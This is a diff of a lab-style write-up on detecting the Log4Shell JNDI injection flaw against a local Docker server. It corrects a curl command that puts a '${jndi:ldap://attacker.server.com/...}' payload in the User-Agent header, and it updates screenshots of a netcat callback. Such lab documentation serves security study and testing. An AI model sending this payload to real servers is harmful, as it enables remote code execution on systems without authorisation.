@@ -27,16 +27,16 @@ Now we can get a little better look at what's to come. If in our request, we use
 
 This injected payload when triggered, gives the attacker access to execute arbitrary code. 
 
-	curl -v -H 'User-Agent: ${jndi:ldap//:attacker.server.com/payload}' '172.17.0.1:8080/'
+	curl -v -H 'User-Agent: ${jndi:ldap://attacker.server.com/payload}' '172.17.0.1:8080/'
 	
 JNDI is an independent API that gives access to directory services, bringing objects or data to the client side through information (name). Its two basic functions are to associate a name with a resource and to find a resource by its name. 
 
 When we make a request to the User-Agent, sending what would be the payload, through Curl to the server, we are acting within the network itself, being safer to detect the vulnerability.
 
-![curl](https://user-images.githubusercontent.com/66689576/160652799-ae36f0a1-1929-4fd1-87c0-ae7e3275f79a.png)
+![curlTrue](https://user-images.githubusercontent.com/66689576/162072699-82285f21-70d6-4668-b94c-96a1ab4eb771.png)
 
 Here we can see that we received a connection from Docker and this validates to us that the server is vulnerable.
 
-![netcat](https://user-images.githubusercontent.com/66689576/160653329-503d3710-d1a7-4f33-ade8-16d5947b5107.png)
+![nc22222](https://user-images.githubusercontent.com/66689576/162073080-26e07482-377c-43d7-afd7-b8009d32631e.png)
 
-![log](https://user-images.githubusercontent.com/66689576/160653312-7620d0cd-9695-4a12-b0cb-b8e3b105c899.png) 
+![logLog](https://user-images.githubusercontent.com/66689576/162073340-6db1bf73-975d-47b7-97d7-011c7c7c76c8.png)
